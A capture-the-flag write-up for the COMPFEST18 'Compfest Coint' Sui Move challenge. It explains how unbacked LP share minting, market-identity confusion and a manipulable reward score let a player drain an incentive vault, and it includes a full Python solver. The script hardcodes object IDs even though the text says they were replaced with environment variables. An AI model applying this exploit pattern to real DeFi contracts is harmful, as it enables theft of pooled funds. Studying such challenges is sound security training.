A liquidity position should be a receipt for assets deposited into a pool. In **Compfest Coint**, that receipt could be created from a number supplied by the caller. Combine it with a second pool that carries the same market identity, and the reward system starts trusting liquidity that was never funded.

This writeup follows the complete path from the Move code to the solve condition. The interesting part is how several individually plausible checks line up behind the wrong accounting assumptions.

![One market. Two identities. Reverse the pair, credit free shares, and claim once.](./assets/bbee3307-8133-4812-8796-b324402fb382.png)

## Challenge at a glance


| Detail                         | Value                                                                                      |
| ------------------------------ | ------------------------------------------------------------------------------------------ |
| Event                          | COMPFEST18 Qualifiers                                                                      |
| Original challenge             | Compfest Coint                                                                             |
| Points in the supplied writeup | 139                                                                                        |
| Platform                       | Sui, using Move contracts                                                                  |
| Objective                      | Make an operator account qualify, then set `Setup.solved` to `true`                        |
| Main weaknesses                | Unbacked LP accounting, market identity confusion, and an attacker-controlled reward score |


> **The short route:** create `RoutePool<USDC, SUIX>` with reserves `(1, 2_000_000)`, open a position, add `1_000` free shares, register a strategy using `bool`, claim the vault's `1_000` reward units, and call `solve`.

The analysis below is adapted from the supplied team writeup. Move excerpts are shortened where indicated. The Python reproduction keeps the original solver's structure but replaces its private key, RPC endpoint, and object IDs with environment variables. The recorded result comes from that writeup; this article does not claim a fresh on-chain execution.

## Start from the win condition

When a challenge contains many modules, the best starting point is the function that decides whether the player has won.

```move filename="setup.move"
public entry fun solve(
    setup: &mut Setup,
    account: &vault::OperatorAccount<CFX>,
    config: &config::GlobalConfig,
) {
    assert!(vault::is_qualified(account, config), ENotQualified);
    setup.solved = true;
}
```

That sends us straight to the vault:

```move filename="vault.move"
public fun is_qualified(
    account: &OperatorAccount<CFX>,
    config: &GlobalConfig,
): bool {
    account.earned >= config::bounty_target(config)
}
```

The default `bounty_target` is `500`. We therefore need to increase `account.earned` to at least `500`, then pass the same account and configuration into `solve`.

The target is an application counter. The shown `OperatorAccount` stores `earned: u64`; the vault similarly tracks a numeric `balance`. Reaching the target does not, by itself, establish that a real `Coin<CFX>` was transferred to the player.

## Follow the objects

Initialization creates a small ecosystem of shared and player-owned objects:


| Object                  | Role in the solve                                                |
| ----------------------- | ---------------------------------------------------------------- |
| `Setup`                 | Stores the final `solved` boolean                                |
| `GlobalConfig`          | Supplies the liquidity threshold, bounty target, and reserve cap |
| `RouteRegistry`         | Tracks market identities and route strategies                    |
| `IncentiveVault<CFX>`   | Holds `1_000` accounted reward units and records who has claimed |
| `RoutePool<SUIX, USDC>` | The original pool, initialized with reserves of `1_000_000` each |
| `OperatorAccount<CFX>`  | The player's account, initially with `earned = 0`                |
| `PriceOracle`           | Supplies one input to the route score                            |


The configuration gives us three particularly useful numbers:

```move filename="config.move"
min_effective_liquidity: 500,
bounty_target: 500,
rebalance_cap: 2_000_000,
```

A shared object can be used through the functions its package exposes. Sharing it does not grant arbitrary access to its fields. The question is whether those functions enforce the right invariants.

Here, the player can create a position and increase its recorded liquidity without presenting any token objects.

## Missing deposit, valid-looking shares

The decisive accounting issue appears in `add_liquidity`:

```move filename="pool.move"
public entry fun add_liquidity<Base, Quote>(
    pool: &mut RoutePool<Base, Quote>,
    position: &mut RoutePosition<Base, Quote>,
    shares: u64,
    config: &GlobalConfig,
) {
    assert!(shares > 0, EInvalidAmount);
    assert!(position.pool == object::id(pool), EWrongPosition);

    let net_shares = math::apply_fee_floor(
        shares,
        config::liquidity_fee_bps(config),
    );

    pool.lp_supply = pool.lp_supply + net_shares;
    pool.accounted_liquidity = pool.accounted_liquidity + net_shares;
    position.shares = position.shares + net_shares;
}
```

The position is tied to the correct pool, and the input must be positive. Both checks make sense. But look at what the function does **not** receive: there is no `Coin<Base>`, `Coin<Quote>`, or other deposit-backed resource.

The caller chooses `shares` directly. With the default liquidity fee of zero, asking for `1_000` shares adds exactly `1_000` to the position, the LP supply, and the accounted liquidity.

The resulting position looks legitimate to the next check:

```move filename="pool.move"
public fun effective_liquidity<Base, Quote>(
    pool: &RoutePool<Base, Quote>,
    position: &RoutePosition<Base, Quote>,
): u64 {
    position.shares * pool.accounted_liquidity / pool.lp_supply
}
```

Because accounted liquidity and LP supply start equal and increase by the same amount, their ratio remains one. The fabricated shares become fabricated effective liquidity.

> **Accounting invariant that should exist:** newly credited LP shares must correspond to assets actually accepted by the pool. A caller-supplied integer is not evidence of a deposit.

## One market, two pool identities

Free liquidity alone does not explain the whole solve. The reward amount also depends on the pool's reserve ratio, so the solver creates another pool with reserves it can choose.

The package distinguishes two market identifiers:

```text
direct(A, B)    differs from direct(B, A)
canonical(A, B) equals canonical(B, A)
```

The direct identity preserves token order. The canonical identity represents the pair independently of that order. In the shown pool-creation function, the duplicate check uses the **direct** market:

```move filename="pool.move"
// Selected checks from create_route_pool.
assert!(reserve_base > 0 && reserve_quote > 0, EInvalidAmount);

let cap = config::rebalance_cap(config);
assert!(
    reserve_base <= cap && reserve_quote <= cap,
    EPoolNotRebalanceable,
);

let direct = registry::direct_market<Base, Quote>();
assert!(!registry::has_market(registry, &direct), EMarketAlreadyRegistered);
```

Meanwhile, the vault checks the pool's **canonical** market. It does not require the original pool object's ID.

The recorded solver uses the reversed generic order:

```text
Original pool:  RoutePool<SUIX, USDC>
New pool:       RoutePool<USDC, SUIX>

New reserves:
    reserve_base  = 1
    reserve_quote = 2_000_000
```

Both reserves are positive and within the configured cap. The reversed pair retains the canonical identity expected by the vault while giving the solver control of a new pool's numbers.

The registry implementation is not reproduced in full in the supplied excerpt. The reversed-order route is documented by its final solver; the broader design problem is that matching a market label is treated as sufficient evidence that a pool is suitable for rewards.

## Prove the one-shot claim

Before building transactions, we can calculate the entire result.

### Effective liquidity

Pool creation initializes both LP supply and accounted liquidity to the sum of its reserves:

$$
S_0 = L_0 = 1 + 2{,}000{,}000 = 2{,}000{,}001.
$$

After adding `1_000` shares with a zero liquidity fee:

$$
S_1 = L_1 = 2{,}001{,}001, \qquad P = 1{,}000.
$$

Substituting into the contract's formula gives:

$$
L_{\mathrm{effective}}
= \left\lfloor\frac{P\cdot L_1}{S_1}\right\rfloor
= 1{,}000.
$$

That comfortably passes the `500` minimum. This calculation does not require an overflow or a rounding edge case.

### Reward amount

The score calculation uses the greater of the integer reserve ratio and the oracle value:

```move filename="pool.move"
public fun quoted_route_score<Base, Quote>(
    pool: &RoutePool<Base, Quote>,
    oracle: &PriceOracle,
): u64 {
    let raw = pool.reserve_quote / pool.reserve_base;
    let oracle_price = oracle::price_e6(oracle);
    if (raw > oracle_price) { raw } else { oracle_price }
}
```

For our pool, `raw = 2_000_000 / 1 = 2_000_000`. Whatever the oracle's nonnegative value, the selected score is at least `2_000_000`.

The vault pays the smaller of that score and its remaining balance:

$$
\mathrm{amount}
= \min(\mathrm{score}, 1{,}000)
= 1{,}000.
$$

Starting from zero, the operator now has `earned = 1_000`, which exceeds the `500` bounty target.

This matters because the vault allows only one claim per sender. A small first claim would spend that opportunity. The skewed reserve ratio makes the first claim sufficient.

## Register a strategy and pass the gates

There is one more required object: a route strategy for the same market. The original solver registers it with `Strategy = bool` and a value of `true`.

Its registration interface constrains the strategy type with `drop`. That is a Move ability requirement, not evidence that the supplied strategy has been approved or performs a particular economic operation. The solver needs no custom witness type for this route. The [Sui Move fundamentals](https://docs.sui.io/develop/write-move/move-fundamentals) explain how generic ability bounds work.

At claim time, the relevant checks line up as follows:


| Claim requirement                     | How the constructed objects satisfy it              |
| ------------------------------------- | --------------------------------------------------- |
| Sender has not claimed before         | Use the fresh challenge player's account            |
| Pool market matches the vault         | The reversed pair has the expected canonical market |
| Strategy market matches the vault     | Register the strategy for that pair                 |
| Position belongs to the pool          | Open it against the newly created pool              |
| Effective liquidity is at least `500` | The unbacked `1_000` shares evaluate to `1_000`     |


Once those checks pass, the vault subtracts the claim from its balance, adds it to `account.earned`, and records the sender as having claimed. Finally, `setup::solve` accepts the account.

## The transaction sequence

The route is six transactions, in this order:

1. **Create the reversed pool.** Call `create_route_pool<USDC, SUIX>` with reserves `(1, 2_000_000)` and recover its ID from the created-object changes.
2. **Open a position.** Call `open_position` on that pool and recover the player-owned position ID.
3. **Add unbacked liquidity.** Call `add_liquidity` with `1_000` shares.
4. **Register the strategy.** Call `register_route_strategy<USDC, SUIX, bool>` with `true` and recover the strategy ID.
5. **Claim incentives.** Supply the vault, pool, strategy, position, operator account, oracle, and configuration.
6. **Solve.** Call `setup::solve` with the setup object, operator account, and configuration.

The source solver sends these separately. That makes created objects easy to inspect between steps, but the six-step workflow is not a single atomic transaction. If a later step fails, earlier successful transactions remain committed. Sui also supports composing commands into an atomic [programmable transaction block](https://docs.sui.io/develop/transactions/ptbs/); that is a separate implementation choice.

## Reproduction script

The following is a cleaned-up adaptation of the supplied `pysui` solver. It retains the historical `SuiConfig`, `SyncClient`, and `SyncTransaction` interface. The original package version was not recorded, so match these calls to the SDK and RPC interface supported by your challenge environment.

Set the following environment variables from your own fresh CTF instance:


| Variable                          | Expected value                                  |
| --------------------------------- | ----------------------------------------------- |
| `SUI_RPC_URL`                     | Your instance's RPC endpoint                    |
| `SUI_PRIVATE_KEY`                 | Its funded player key                           |
| `SUI_WALLET_ADDR`                 | The corresponding player address                |
| `SUI_PACKAGE_ID`                  | The deployed challenge package                  |
| `SUI_SETUP_ID`, `SUI_REGISTRY_ID` | Setup and registry object IDs                   |
| `SUI_VAULT_ID`, `SUI_ACCOUNT_ID`  | Incentive vault and player operator account IDs |
| `SUI_CONFIG_ID`, `SUI_ORACLE_ID`  | Configuration and oracle object IDs             |


The original endpoint and private key are intentionally not embedded below. These values are instance-specific, and the source's old deployment is unnecessary for understanding the exploit.

```python filename="solve.py"
import os

from pysui import SuiConfig, SyncClient
from pysui.sui.sui_txn import SyncTransaction
from pysui.sui.sui_types import ObjectID, SuiU64, SuiBoolean

RPC_URL = os.environ["SUI_RPC_URL"]
PRIVKEY = os.environ["SUI_PRIVATE_KEY"]
WALLET_ADDR = "0x5c77b47981370bd174fc25086af8e88337b227db4568f69398a8bed054218f2d"

PACKAGE_ID = "0x9d5513ada315f5735f895d5d814d01bb16273e309e970c61d8f1f8ea1c460cac"
SETUP_ID   = "0x4713a06727bdc4eb10a3a3790986af38561f4bf491036b5769e6b90ee54831c3"
REGISTRY   = "0x812beafdc741895af4e1eee7aa13701ce73e630fd8eae2ea17a5864c91c40f9d"
VAULT      = "0xd57ae6151e955fbfc31c2aa3a440cecf30f10996dfe6a7b0333a8ee17a145a28"
POOL       = "0x597c9d19b0344c8058539ef5465d36fcac9da9d3dde18ce4fb09a70a97e7c05a"
ACCOUNT    = "0xe57e2ac9a6eb993bce9fcaafd890f382cad58fc9a200806b2508116a76b4180b"
CONFIG     = "0x4f3ee68d5d8766333e790bd6488422826b6d864401287c716f3923c5f503b489"
ORACLE     = "0xad53127cb242610ce8183b29b56b085a2bd9d38080d1e9174ba22a5ca2a4fd16"

SUIX = f"{PACKAGE_ID}::assets::SUIX"
USDC = f"{PACKAGE_ID}::assets::USDC"
CFX  = f"{PACKAGE_ID}::assets::CFX"

REBALANCE_CAP  = 2_000_000
SHARES_TO_MINT = 1000 
NEW_BASE, NEW_QUOTE = USDC, SUIX

STRATEGY_TYPE = "bool"

cfg = SuiConfig.user_config(rpc_url=RPC_URL, prv_keys=[PRIVKEY])
client = SyncClient(cfg)


def run(txn: SyncTransaction, label: str):
    result = txn.execute(
        gas_budget="500000000",
        options={"showObjectChanges": True, "showEffects": True},
    )
    if not result.is_ok():
        raise RuntimeError(f"[{label}] transaction failed: {result.result_string}")
    data = result.result_data
    if getattr(data, "effects", None) and data.effects.status.status != "success":
        raise RuntimeError(f"[{label}] move abort: {data.effects.status}")
    print(f"[{label}] digest = {data.digest}")
    return data


def created_object_of_type(tx_data, type_substr: str, owner_addr: str | None = None):
    for change in tx_data.object_changes or []:
        if change.get("type") != "created":
            continue
        if type_substr not in change.get("objectType", ""):
            continue
        if owner_addr is not None:
            owner = change.get("owner", {})
            if owner.get("AddressOwner") != owner_addr:
                continue
        return change["objectId"]
    raise RuntimeError(f"no created object matching '{type_substr}' found")

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::pool::create_route_pool",
    arguments=[
        ObjectID(REGISTRY),
        ObjectID(CONFIG),
        SuiU64(1),                 
        SuiU64(REBALANCE_CAP),     
    ],
    type_arguments=[NEW_BASE, NEW_QUOTE],
)
data = run(txn, "create_route_pool")
new_pool_id = created_object_of_type(data, "pool::RoutePool<")
print("new pool id:", new_pool_id)

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::pool::open_position",
    arguments=[ObjectID(new_pool_id)],
    type_arguments=[NEW_BASE, NEW_QUOTE],
)
data = run(txn, "open_position")
position_id = created_object_of_type(data, "pool::RoutePosition<", owner_addr=WALLET_ADDR)
print("position id:", position_id)

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::pool::add_liquidity",
    arguments=[
        ObjectID(new_pool_id),
        ObjectID(position_id),
        SuiU64(SHARES_TO_MINT),
        ObjectID(CONFIG),
    ],
    type_arguments=[NEW_BASE, NEW_QUOTE],
)
run(txn, "add_liquidity")

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::registry::register_route_strategy",
    arguments=[
        ObjectID(REGISTRY),
        SuiBoolean(True),
    ],
    type_arguments=[NEW_BASE, NEW_QUOTE, STRATEGY_TYPE],
)
data = run(txn, "register_route_strategy")
strategy_id = created_object_of_type(data, "registry::RouteStrategy<")
print("strategy id:", strategy_id)

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::vault::claim_route_incentives",
    arguments=[
        ObjectID(VAULT),
        ObjectID(new_pool_id),
        ObjectID(strategy_id),
        ObjectID(position_id),
        ObjectID(ACCOUNT),
        ObjectID(ORACLE),
        ObjectID(CONFIG),
    ],
    type_arguments=[NEW_BASE, NEW_QUOTE, STRATEGY_TYPE],
)
run(txn, "claim_route_incentives")

txn = SyncTransaction(client=client)
txn.move_call(
    target=f"{PACKAGE_ID}::setup::solve",
    arguments=[ObjectID(SETUP_ID), ObjectID(ACCOUNT), ObjectID(CONFIG)],
    type_arguments=[],
)
run(txn, "solve")

print("\nDone. Check Setup.solved via setup::is_solved or a get_object call on", SETUP_ID)
```

The helper checks transaction effects instead of treating a successful RPC response as proof that the Move call succeeded. It also discovers newly created objects from the response rather than hardcoding IDs from another instance.

## Result and verification

For the initial state described in the writeup, the expected accounting transitions are:


| State                          | Before the claim | After the claim |
| ------------------------------ | ----------------: | ---------------: |
| Position's effective liquidity | `1_000`          | `1_000`         |
| Vault balance                  | `1_000`          | `0`             |
| Operator's earned amount       | `0`              | `1_000`         |
| Sender's claim record          | Absent           | Present         |


After the final call, `Setup.solved` should be `true`. Read the object or use the challenge's verification interface to confirm it; a printed transaction digest alone is not enough.

The supplied writeup includes the following flag-found screenshot. It documents the original recorded outcome rather than a new run of the adapted script.

![Flag-found confirmation reproduced from the original COMPFEST18 team writeup.](./assets/2da886f9-8518-4f58-9364-ab50eaf06944.png)

```plaintext filename="Flag"
COMPFEST18{Izin_Pamit_dari_Dunia_Crypto_Hari_ini_mungkin_adalah_hari_paling_berat_buat_saya_Tangan_gemetar_saat_menulis_ini_dada_sesak_kepala_penuh_pikiran_Dunia_crypto_benar_benar_ngga_kenal_ampun_Saya_sudah_berjuang_sejauh_ini_berharap_ada_cahaya_di_ujung_grafik_merah_itu_Tapi_kenyataannya_Crypto_itu_sadis_kejam_Kadang_bukan_hanya_menguras_saldo_tapi_juga_hati_dan_semangat_Buat_teman_teman_yang_belum_terjun_dengarkan_baik_baik_Jangan_gegabah_Dunia_ini_bukan_tempat_untuk_asal_coba_Belajarlah_dulu_pahami_risikonya_dan_jangan_pernah_taruh_lebih_dari_yang_sanggup_kamu_relakan_Saya_mohon_maaf_kalau_selama_ini_ada_kata_kata_saya_yang_menyinggung_siapa_pun_di_sini_Tidak_pernah_ada_niat_buruk_hanya_emosi_dari_seseorang_yang_terlalu_lama_bertahan_dalam_badai_Dan_sekarang_saya_menyerah_Saya_ingin_istirahat_Kalian_yang_masih_kuat_lanjutkan_perjuangan_kalian_Tapi_bagi_yang_juga_merasa_hancur_mungkin_sudah_saatnya_kita_CL_bersama_Alt_season_sudah_benar_benar_berakhir_Terima_kasih_untuk_semua_cerita_tawa_dan_luka_yang_pernah_kita_bagi_di_sini_Sampai_jumpa_di_kehidupan_berikutnya_bukan_sebagai_trader_tapi_sebagai_manusia_yang_sudah_belajar}
```

## Sources

- **Primary challenge material:** the supplied *Quals COMPFEST18* team writeup, section **Compfest Coint (139 pts)**, printed pages **57-74**. The code path, constants, historical solver, and recorded flag confirmation come from this source.
- [Sui Move syntax fundamentals](https://docs.sui.io/develop/write-move/move-fundamentals), for objects, abilities, and generic bounds.
- [Sui programmable transaction blocks](https://docs.sui.io/develop/transactions/ptbs/), for the distinction between an atomic PTB and a sequence of separate transactions.

